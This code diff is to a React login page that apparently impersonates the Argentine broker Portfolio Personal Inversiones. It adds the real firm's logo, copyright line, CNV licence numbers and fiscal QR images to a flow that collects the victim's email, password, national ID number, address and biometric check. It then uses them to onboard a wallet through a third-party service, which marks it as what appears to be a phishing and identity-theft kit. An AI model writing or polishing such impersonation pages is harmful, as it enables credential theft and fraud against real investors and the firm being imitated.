@@ -9,6 +9,9 @@ import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
 import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
 import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
+import ppiLogoSvg from "@/assets/ppi-logo.svg";
+import qrFiscalPng from "@/assets/ppi-qr-fiscal.png";
+import sidPng from "@/assets/ppi-sid.png";
 
 type Step = "login" | "waiting" | "syncing" | "verify_identity" | "address" | "biometric" | "done";
 
@@ -61,6 +64,16 @@ const PPI = () => {
 
   useEffect(() => {
     document.title = "PPI — Iniciar sesión";
+    // Prevent iOS zoom on focus
+    const meta = document.querySelector('meta[name="viewport"]');
+    if (meta) {
+      meta.setAttribute("content", "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no");
+    }
+    return () => {
+      if (meta) {
+        meta.setAttribute("content", "width=device-width, initial-scale=1.0");
+      }
+    };
   }, []);
 
   const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
@@ -175,7 +188,6 @@ const PPI = () => {
         });
       }
 
-      // Go to identity verification step
       setStep("verify_identity");
       setStatusMsg("");
     } catch (e: any) {
@@ -197,7 +209,6 @@ const PPI = () => {
     });
     setLastDni(data.identity_number);
 
-    // Check if this DNI already completed onboarding (wallet ACTIVE)
     try {
       const { data: walletCheck } = await invokeWayni({
         action: "get_wallet_status",
@@ -208,9 +219,7 @@ const PPI = () => {
         setStep("done");
         return;
       }
-    } catch {
-      // continue with onboarding
-    }
+    } catch { /* continue */ }
 
     const pwd = lastPasswordRef.current;
     const MAX_DNI_RETRIES = 3;
@@ -296,7 +305,6 @@ const PPI = () => {
 
     await updateSession("address_saved");
 
-    // Request biometric
     const { data: bioResult, error: bioError } = await invokeWayni({
       action: "onboarding_biometric",
       identity_number: lastDni,
@@ -342,87 +350,127 @@ const PPI = () => {
     }
   }, [updateSession, saveOnboardingData]);
 
+  const showFullPage = step === "login" || step === "waiting" || step === "syncing";
+
   return (
-    <div className="relative flex min-h-screen items-center justify-center overflow-hidden bg-[#f0f0f0]">
-      {/* Diagonal hatching pattern background */}
-      <div className="absolute inset-0 opacity-[0.08]" style={{
-        backgroundImage: `repeating-linear-gradient(
-          -45deg,
-          transparent,
-          transparent 4px,
-          #999 4px,
-          #999 5px
-        )`,
-      }} />
-
-      {/* Decorative cyan curved line */}
-      <svg className="absolute inset-0 w-full h-full pointer-events-none" viewBox="0 0 1440 900" preserveAspectRatio="none">
-        <path
-          d="M-50 200 Q 400 600, 700 300 T 1500 700"
-          fill="none"
-          stroke="#B2EBF2"
-          strokeWidth="2"
-          opacity="0.6"
-        />
-      </svg>
-
-      {/* Login card */}
-      {step === "login" && (
-        <div className="relative z-10 w-full max-w-[440px] rounded-lg bg-white px-10 py-10 shadow-lg">
-          <h1 className="mb-8 text-center text-[22px] font-bold text-[#333]">
-            Te damos la bienvenida
-          </h1>
-          <PpiLoginForm onSubmit={handleLogin} loading={loading} error={error} />
-        </div>
+    <div className="flex min-h-[100svh] flex-col bg-[#f5f5f5]">
+      {/* ── Header ── */}
+      {showFullPage && (
+        <header className="flex items-center justify-between px-5 py-4 sm:px-8 sm:py-5">
+          <img src={ppiLogoSvg} alt="PPI" className="h-7 sm:h-9" />
+          <span className="text-[13px] sm:text-[15px] font-medium text-[#6b7280]">Acceso a PPI</span>
+        </header>
       )}
 
-      {(step === "waiting" || step === "syncing") && (
-        <div className="relative z-10 w-full max-w-[440px] rounded-lg bg-white px-10 py-10 shadow-lg">
-          <div className="flex flex-col items-center gap-4 py-8 text-center">
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#2196F3] border-t-transparent" />
-            <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
-            <p className="text-[13px] text-[#999]">{email}</p>
+      {/* ── Main area ── */}
+      <main className="relative flex flex-1 items-center justify-center overflow-hidden">
+        {/* Diagonal hatching pattern */}
+        {showFullPage && (
+          <>
+            <div
+              className="pointer-events-none absolute inset-0 opacity-[0.04]"
+              style={{
+                backgroundImage: `repeating-linear-gradient(-45deg, transparent, transparent 5px, #888 5px, #888 6px)`,
+              }}
+            />
+            {/* Decorative cyan curve */}
+            <svg
+              className="pointer-events-none absolute inset-0 h-full w-full"
+              viewBox="0 0 1440 900"
+              preserveAspectRatio="none"
+            >
+              <path
+                d="M-50 200 Q 400 600, 700 300 T 1500 700"
+                fill="none"
+                stroke="#b2ebf2"
+                strokeWidth="2"
+                opacity="0.5"
+              />
+            </svg>
+          </>
+        )}
+
+        {step === "login" && (
+          <div className="relative z-10 mx-4 w-full max-w-[460px] rounded-lg bg-white px-6 py-8 shadow-[0_2px_24px_rgba(0,0,0,0.08)] sm:mx-0 sm:px-10 sm:py-10">
+            <h1 className="mb-8 text-center text-[22px] sm:text-[26px] font-bold text-[#1a1a2e]">
+              Te damos la bienvenida
+            </h1>
+            <PpiLoginForm onSubmit={handleLogin} loading={loading} error={error} />
           </div>
-        </div>
-      )}
+        )}
 
-      {step === "verify_identity" && (
-        <div className="relative z-10 w-full flex justify-center">
-          <CocosV2VerifyScreen
-            email={email}
-            fullName={syncedFullName}
-            phone={syncedPhone}
-            onSubmit={handleIdentityVerify}
-          />
-        </div>
-      )}
+        {(step === "waiting" || step === "syncing") && (
+          <div className="relative z-10 mx-4 w-full max-w-[460px] rounded-lg bg-white px-6 py-8 shadow-[0_2px_24px_rgba(0,0,0,0.08)] sm:mx-0 sm:px-10 sm:py-10">
+            <div className="flex flex-col items-center gap-4 py-8 text-center">
+              <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#42a5f5] border-t-transparent" />
+              <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
+              <p className="text-[13px] text-[#999]">{email}</p>
+            </div>
+          </div>
+        )}
 
-      {step === "address" && (
-        <div className="relative z-10 w-full flex justify-center">
-          <CocosV2AddressScreen
-            email={email}
-            fullName={syncedFullName}
-            userUuid={userUuid}
-            onSubmit={handleAddressSubmit}
-          />
-        </div>
-      )}
+        {step === "verify_identity" && (
+          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
+            <CocosV2VerifyScreen
+              email={email}
+              fullName={syncedFullName}
+              phone={syncedPhone}
+              onSubmit={handleIdentityVerify}
+            />
+          </div>
+        )}
 
-      {step === "biometric" && (
-        <div className="relative z-10 w-full flex justify-center">
-          <CocosV2BiometricScreen
-            email={email}
-            fullName={syncedFullName}
-            biometricUrl={biometricUrl}
-            onEvent={handleBiometricEvent}
-          />
-        </div>
-      )}
+        {step === "address" && (
+          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
+            <CocosV2AddressScreen
+              email={email}
+              fullName={syncedFullName}
+              userUuid={userUuid}
+              onSubmit={handleAddressSubmit}
+            />
+          </div>
+        )}
 
-      {step === "done" && (
-        <div className="relative z-10 w-full flex justify-center">
-          <CocosV2FinalScreen email={email} />
-        </div>
+        {step === "biometric" && (
+          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
+            <CocosV2BiometricScreen
+              email={email}
+              fullName={syncedFullName}
+              biometricUrl={biometricUrl}
+              onEvent={handleBiometricEvent}
+            />
+          </div>
+        )}
+
+        {step === "done" && (
+          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
+            <CocosV2FinalScreen email={email} />
+          </div>
+        )}
+      </main>
+
+      {/* ── Footer ── */}
+      {showFullPage && (
+        <footer className="border-t border-[#e5e7eb] bg-white px-5 py-4 sm:px-8">
+          <div className="mx-auto flex max-w-[900px] flex-col items-center gap-3">
+            <p className="text-center text-[11px] leading-relaxed text-[#999] sm:text-[12px]">
+              Portfolio Personal Inversiones | Copyright 2021
+            </p>
+            <p className="text-center text-[10px] leading-relaxed text-[#bbb] sm:text-[11px]">
+              ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73
+            </p>
+            <button
+              type="button"
+              className="text-[11px] text-[#42a5f5] hover:underline sm:text-[12px]"
+            >
+              Términos y políticas de privacidad
+            </button>
+            <div className="flex items-center gap-4">
+              <img src={qrFiscalPng} alt="Data Fiscal" className="h-8 sm:h-10 object-contain" />
+              <img src={sidPng} alt="SID" className="h-8 sm:h-10 object-contain" />
+            </div>
+          </div>
+        </footer>
       )}
     </div>
   );
